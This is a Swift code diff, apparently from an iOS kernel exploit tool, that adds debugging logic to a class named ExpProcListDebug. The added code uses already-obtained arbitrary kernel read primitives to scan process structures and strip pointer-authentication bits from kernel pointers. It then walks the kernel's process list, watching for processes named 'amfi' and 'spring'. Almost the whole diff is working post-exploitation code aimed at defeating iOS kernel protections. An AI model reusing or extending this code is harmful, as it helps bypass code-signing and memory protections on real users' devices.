@@ -100,55 +100,106 @@ final class ExpProcListDebug {
         
         // Scan our_proc first 0x20 bytes for kernel pointers (find list links)
         log.append("")
-        log.append("── Scanning our_proc[0..0x40] for list pointers ──")
-        for off in stride(from: 0, to: 0x40, by: 8) {
-            let val = ds_kread64(ourProc + UInt64(off))
-            if val > 0xfffffff000000000 && val < 0xfffffffffff00000 && val != ourProc && val != kernProc {
-                // Check if target has a valid PID
-                let targetPid = ds_kread32(val + 0x60) // off_proc_p_pid = 0x60
-                if targetPid > 0 && targetPid < 65535 {
-                    log.append("  off 0x\(String(format:"%02x",off)) → 0x\(String(format:"%llx",val)) pid=\(targetPid) ✅")
-                } else {
-                    log.append("  off 0x\(String(format:"%02x",off)) → 0x\(String(format:"%llx",val)) (not proc)")
+        log.append("── Scanning our_proc[0..0x100] for proc-like pointers ──")
+        log.append("(Looking for pointers where target+0x60 has valid PID)")
+        log.append("")
+        
+        // PAC strip: on A12+ kernel pointers have PAC bits
+        // Try multiple strip strategies
+        let pacMasks: [UInt64] = [
+            0x0000007FFFFFFFFF, // T1SZ=25 (39-bit VA)
+            0x00000FFFFFFFFFFF, // T1SZ=17 (47-bit VA)
+            0x0000FFFFFFFFFFFF, // 48-bit
+            0xFFFFFFFFFFFFFFFF, // no strip (maybe no PAC on this field)
+        ]
+        
+        // Also try with kernel upper bits forced
+        func stripPAC(_ ptr: UInt64) -> UInt64 {
+            if ptr == 0 { return 0 }
+            // If top byte is 0xFF, it's likely a kernel pointer with PAC
+            // Strip to get canonical kernel address
+            // Kernel VA on iOS: 0xfffffff0_00000000 base
+            // With PAC: top bits get mangled
+            // Strategy: OR with 0xfffffff000000000 after masking lower bits
+            let lower = ptr & 0x0000007FFFFFFFFF
+            let asKern = lower | 0xfffffff000000000
+            return asKern
+        }
+        
+        for off in stride(from: 0, to: 0x100, by: 8) {
+            let raw = ds_kread64(ourProc + UInt64(off))
+            if raw == 0 { continue }
+            
+            // Try raw first
+            var found = false
+            let candidates = [raw, stripPAC(raw)]
+            
+            for candidate in candidates {
+                if candidate > 0xfffffff000000000 && candidate < 0xfffffffffff00000 
+                   && candidate != ourProc && candidate != kernProc {
+                    let targetPid = ds_kread32(candidate + 0x60)
+                    if targetPid > 0 && targetPid < 65535 && targetPid != ourPid {
+                        log.append("  ✅ off 0x\(String(format:"%02x",off)) → pid=\(targetPid) (raw=0x\(String(format:"%llx",raw)))")
+                        found = true
+                        break
+                    }
                 }
+            }
+            
+            if !found && off < 0x20 {
+                // Log first few entries even if not proc
+                log.append("  off 0x\(String(format:"%02x",off)) = 0x\(String(format:"%llx",raw))")
             }
         }
         
         if nextPtr == 0 || nextPtr == kernProc {
             log.append("")
-            log.append("❌ kern_proc next is NULL — trying from our_proc...")
+            log.append("kern_proc next is NULL — trying PAC-stripped from our_proc...")
             
-            // Try walking from our_proc
-            if ourNext > 0xfffffff000000000 && ourNext != ourProc {
-                log.append("✅ our_proc has valid next pointer!")
-                var current = ourNext
-                var count = 0
-                while current != 0 && current != ourProc && current != kernProc && count < 30 {
-                    count += 1
-                    let pid = ds_kread32(current + 0x60)
-                    var nb = [UInt8](repeating: 0, count: 16)
-                    let v = ds_kread64(current + UInt64(off_proc_p_name))
-                    let v2 = ds_kread64(current + UInt64(off_proc_p_name) + 8)
-                    withUnsafeBytes(of: v) { for j in 0..<8 { nb[j] = $0[j] } }
-                    withUnsafeBytes(of: v2) { for j in 0..<8 { nb[8+j] = $0[j] } }
-                    let pname = String(bytes: nb.prefix(while: { $0 >= 0x20 && $0 < 0x7f }), encoding: .ascii) ?? "?"
-                    
-                    if count <= 15 || pname.contains("amfi") {
-                        log.append("  [\(count)] pid=\(pid) '\(pname)'")
-                    }
-                    current = ds_kread64(current + UInt64(off_proc_p_list_le_next))
-                }
-                log.append("  walked \(count) procs")
-            } else {
-                log.append("our_proc next also invalid")
-                log.append("Scanning kern_proc for valid pointers...")
-                for off in stride(from: 0, to: 0x80, by: 8) {
-                    let val = ds_kread64(kernProc + UInt64(off))
-                    if val > 0xfffffff000000000 && val < 0xfffffffffff00000 && val != kernProc {
-                        let maybePid = ds_kread32(val + 0x60)
-                        if maybePid > 0 && maybePid < 65535 {
-                            log.append("  ✅ kern+0x\(String(format:"%x",off)) → pid=\(maybePid)")
+            // Try PAC-stripped our_proc next
+            func stripPACk(_ ptr: UInt64) -> UInt64 {
+                if ptr == 0 { return 0 }
+                let lower = ptr & 0x0000007FFFFFFFFF
+                return lower | 0xfffffff000000000
+            }
+            
+            let strippedNext = stripPACk(ourNext)
+            let strippedPrev = stripPACk(ourPrev)
+            log.append("PAC-stripped next: 0x\(String(format:"%llx", strippedNext))")
+            log.append("PAC-stripped prev: 0x\(String(format:"%llx", strippedPrev))")
+            
+            // Check if stripped pointers are valid procs
+            for (label, ptr) in [("next", strippedNext), ("prev", strippedPrev)] {
+                if ptr > 0xfffffff000000000 && ptr < 0xfffffffffff00000 && ptr != ourProc {
+                    let pid = ds_kread32(ptr + 0x60)
+                    if pid > 0 && pid < 65535 {
+                        log.append("✅ \(label) → pid=\(pid) — PAC strip WORKS!")
+                        
+                        // Walk the list!
+                        log.append("")
+                        log.append("Walking proc list (PAC-stripped)...")
+                        var current = ptr
+                        var count = 0
+                        while current != 0 && current != ourProc && count < 50 {
+                            count += 1
+                            let p = ds_kread32(current + 0x60)
+                            var nb = [UInt8](repeating: 0, count: 16)
+                            let v = ds_kread64(current + UInt64(off_proc_p_name))
+                            let v2 = ds_kread64(current + UInt64(off_proc_p_name) + 8)
+                            withUnsafeBytes(of: v) { for j in 0..<8 { nb[j] = $0[j] } }
+                            withUnsafeBytes(of: v2) { for j in 0..<8 { nb[8+j] = $0[j] } }
+                            let pn = String(bytes: nb.prefix(while: { $0 >= 0x20 && $0 < 0x7f }), encoding: .ascii) ?? "?"
+                            
+                            if count <= 20 || pn.contains("amfi") || pn.contains("spring") {
+                                log.append("  [\(count)] pid=\(p) '\(pn)'")
+                            }
+                            
+                            let rawNext = ds_kread64(current + 0x0)
+                            current = stripPACk(rawNext)
+                            if current == ourProc || current == kernProc { break }
                         }
+                        log.append("  total: \(count) procs")
+                        break
                     }
                 }
             }
